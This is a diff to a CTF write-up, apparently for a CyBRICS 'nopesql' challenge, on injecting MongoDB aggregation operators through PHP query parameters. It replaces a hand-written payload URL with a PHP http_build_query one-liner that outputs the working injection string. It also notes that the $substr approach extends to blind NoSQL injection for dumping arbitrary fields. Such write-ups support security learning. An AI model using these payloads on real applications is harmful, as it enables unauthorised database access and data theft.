@@ -201,18 +201,13 @@ Unfortunately, we have to consider that the data structure that constitutes the 
 }
 ```
 
-To avoid mistakes while encoding the parameters that will be transformed into the data structure used for the aggregate query, it is strongly advised to add a `print("<pre>".print_r($filter, true)."</pre>");` in the php code running locally. A working payload is provided below (each argument is placed on a single line to ease readability):
+Manually building the query string is an error prone task that we can luckily avoid thanks to the PHP [`http_build_query`](https://www.php.net/manual/en/function.http-build-query.php) function (thx [smaury](https://twitter.com/smaury92) for the hint!). Using it we can generate an URL-encoded query string from a given PHP data structure such as an associative array.
 
-```
-http://127.0.0.1:5001/
-?filter[$cond][if][$eq][][$substr][]=$title
-&filter[$cond][if][$eq][0][$substr][][$year][$dateFromString][dateString]=0000-02-08T12:10:40.787Z
-&filter[$cond][if][$eq][0][$substr][][$year][$dateFromString][dateString]=0007-02-08T12:10:40.787Z
-&filter[$cond][if][$eq][]=cybrics
-&filter[$cond][then]=$title
-&filter[$cond][else]=
+```PHP
+php > echo urldecode(http_build_query(json_decode('{"filter": {"$cond": {"if": {"$eq": [{"$substr": ["$title", {"$year": {"$dateFromString": {"dateString": "0000-02-08T12:10:40.787Z"}}}, {"$year": {"$dateFromString": {"dateString": "0007-02-08T12:10:40.787Z"}}}]}, "cybrics"]}, "then": "$title", "else": ""}}}')));
+filter[$cond][if][$eq][0][$substr][0]=$title&filter[$cond][if][$eq][0][$substr][1][$year][$dateFromString][dateString]=0000-02-08T12:10:40.787Z&filter[$cond][if][$eq][0][$substr][2][$year][$dateFromString][dateString]=0007-02-08T12:10:40.787Z&filter[$cond][if][$eq][1]=cybrics&filter[$cond][then]=$title&filter[$cond][else]=
 ```
 
 See the script [nopesql.py](nopesql.py) to perform the exploitation automatically.
 
-Also notice that this approach involving the `$substr` operator is perfectly suitable to mount a blind-noSQL injection and dump arbitrary fields by iterating over guesses on the value to increment the length of the known prefix.
+Also notice that this approach involving the `$substr` operator is perfectly suitable to mount a generic blind-noSQL injection and dump arbitrary fields by iterating over incremental guesses.
